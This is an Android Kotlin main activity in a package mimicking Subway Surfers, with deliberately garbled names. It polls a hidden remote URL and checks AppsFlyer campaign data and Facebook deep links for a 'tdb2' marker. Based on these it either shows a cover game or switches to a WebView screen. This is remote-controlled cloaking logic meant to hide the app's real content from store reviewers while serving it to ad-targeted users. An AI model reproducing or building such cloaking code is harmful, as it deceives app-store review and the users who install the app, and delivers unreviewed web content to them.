package com.kiloo.subwaysurfr

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.kiloo.subwaysurfr.GooodClass.Companion.AF_DEV_KEYfgtt
import com.kiloo.subwaysurfr.GooodClass.Companion.C1111111
import com.kiloo.subwaysurfr.GooodClass.Companion.CHhhhhh
import com.kiloo.subwaysurfr.GooodClass.Companion.D111111
import com.kiloo.subwaysurfr.GooodClass.Companion.linkAppsCheckPart1frr5
import com.kiloo.subwaysurfr.GooodClass.Companion.fr65linkAppsCheckPart2
import com.kiloo.subwaysurfr.databinding.ActivityMainBinding
import com.kiloo.subwaysurfr.gimi.GameGameActivity
import kotlinx.coroutines.*
import java.lang.Exception
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    lateinit var fvgtgtgt: String


    var checkerdfrgtijj5: String = "null"

    private lateinit var bindMainfrf59g5t95: ActivityMainBinding


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMainfrf59g5t95 = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainfrf59g5t95.root)
        fvgtgtgt = ""
        deePPdfrgftgt5(this)

        val prefsdfrgt56955 = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefsdfrgt56955.getBoolean("activity_exec", false)) {
            val sharPreffrgt64 = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPreffrgt64.getString(CHhhhhh, "null")) {

                "2" -> {
                    skipMeeeeeee()
                }
                "3" -> {
                    testMeUACfrgtt()
                }
                "4" -> {
                    testWVvvvvvvvvvvvvvvv()
                }
                "nm" -> {
                    testWVvvvvvvvvvvvvvvv()
                }
                "dp" -> {
                    testWVvvvvvvvvvvvvvvv()
                }
                "org" -> {
                    skipMeeeeeee()
                }
                else -> {
                    skipMeeeeeee()
                }
            }

        } else {
            val dfrgtt5exec = prefsdfrgt56955.edit()
            dfrgtt5exec.putBoolean("activity_exec", true)
            dfrgtt5exec.apply()

            val jobuuuuuuuuu = GlobalScope.launch(Dispatchers.IO) {
                checkerdfrgtijj5 = frgtgtgetCheckCode(linkAppsCheckPart1frr5 + fr65linkAppsCheckPart2)
            }
            runBlocking {
                try {
                    jobuuuuuuuuu.join()
                } catch (_: Exception) {
                }
            }

            when (checkerdfrgtijj5) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEYfgtt, frggtgt4conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    efrg5t6OrNotChecker(1500)
                }
                "2" -> {
                    skipMeeeeeee()
                }
                "3" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEYfgtt, frggtgt4conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    gtt5afRecordedForUAC(1500)
                }
                "4" -> {
                    testWVvvvvvvvvvvvvvvv()
                }

            }
        }
    }


    private suspend fun frgtgtgetCheckCode(link: String): String {
        val urldfrgt = URL(link)
        val twoStrfgt = "2"
        val oneStrdfgrt5 = "1"
        val activeStrndfrgt5 = "0"
        val testStrdfr6r5 = "3"
        val frgt56fourStr = "4"

        val fgrthy58 = withContext(Dispatchers.IO) {
            urldfrgt.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = fgrthy58.inputStream.bufferedReader().readText()) {

                "1" -> {
                    oneStrdfgrt5
                }
                "2" -> {
                    val dfrgtt5sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val dfrg5t666editor = dfrgtt5sharPref.edit()
                    dfrg5t666editor.putString(CHhhhhh, twoStrfgt)
                    dfrg5t666editor.apply()
                    twoStrfgt
                }
                "3" -> {
                    val dfrgf56t6sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val dfr6gf56teditor = dfrgf56t6sharPref.edit()
                    dfr6gf56teditor.putString(CHhhhhh, testStrdfr6r5)
                    dfr6gf56teditor.apply()
                    testStrdfr6r5
                }
                "4" -> {
                    val sharPref5fr = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val dfr5r56editor = sharPref5fr.edit()
                    dfr5r56editor.putString(CHhhhhh, frgt56fourStr)
                    dfr5r56editor.apply()
                    frgt56fourStr
                }
                else -> {
                    activeStrndfrgt5
                }
            }
        } finally {
            fgrthy58.disconnect()
        }

    }

    private fun gtt5afRecordedForUAC(timeInterval: Long): Job {
        val frgtt45sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val dfr5gt65g6thawk1: String? = frgtt45sharPref.getString(C1111111, null)
                if (dfr5gt65g6thawk1 != null) {
                    testMeUACfrgtt()
                    break
                } else {
                    val hawk1: String? = frgtt45sharPref.getString(C1111111, null)
                    delay(timeInterval)
                }
            }
        }
    }

    private fun efrg5t6OrNotChecker(timeInterval: Long): Job {

        val dfrg56t65t6sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val fr5hawk1: String? = dfrg56t65t6sharPref.getString(C1111111, null)
                val dfrr5hawkdeep: String? = dfrg56t65t6sharPref.getString(D111111, "null")

                Log.d("lolo", "fr5hawk1 is ${fr5hawk1}")
                Log.d("lolo", "dfrr5hawkdeep is ${dfrr5hawkdeep}")
                if (fr5hawk1 != null) {
                    if (fr5hawk1.contains("tdb2")) {
                        val dfr56editor = dfrg56t65t6sharPref.edit()
                        dfr56editor.putString(CHhhhhh, "nm")
                        dfr56editor.apply()
                        testWVvvvvvvvvvvvvvvv()
                    } else if (dfrr5hawkdeep != null) {
                        if (dfrr5hawkdeep.contains("tdb2")) {
                            testWVvvvvvvvvvvvvvvv()
                        } else {
                            val f6r55g6teditor = dfrg56t65t6sharPref.edit()
                            f6r55g6teditor.putString(CHhhhhh, "org")
                            f6r55g6teditor.apply()
                            skipMeeeeeee()
                        }
                    }
                    break
                } else {
                    val hawk1: String? = dfrg56t65t6sharPref.getString(C1111111, null)
                    delay(timeInterval)
                }
            }
        }
    }



    val frggtgt4conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val frgtt565gt6 = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val frgt56editor = frgtt565gt6.edit()
            val frrg6t56dataGotten = data?.get("campaign").toString()
            frgt56editor.putString(C1111111, frrg6t56dataGotten)
            frgt56editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }




    private fun testMeUACfrgtt() {
        Intent(this, AgainFilterActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun testWVvvvvvvvvvvvvvvv() {
        Intent(this, VeeeebVievActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun skipMeeeeeee() {
        Intent(this, GameGameActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    fun deePPdfrgftgt5(context: Context) {
        val sharPreffrgtt5 = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editorfr5fg6t6 = sharPreffrgtt5.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val paramsfr5f6g55g6t = appLinkData.targetUri.host

                editorfr5fg6t6.putString(D111111, paramsfr5f6g55g6t.toString())
                editorfr5fg6t6.apply()
                if (paramsfr5f6g55g6t!!.contains("tdb2")) {
                    editorfr5fg6t6.putString(CHhhhhh, "dp")
                    editorfr5fg6t6.apply()
                }

            }
            if (appLinkData == null) {

            }

        }
    }


}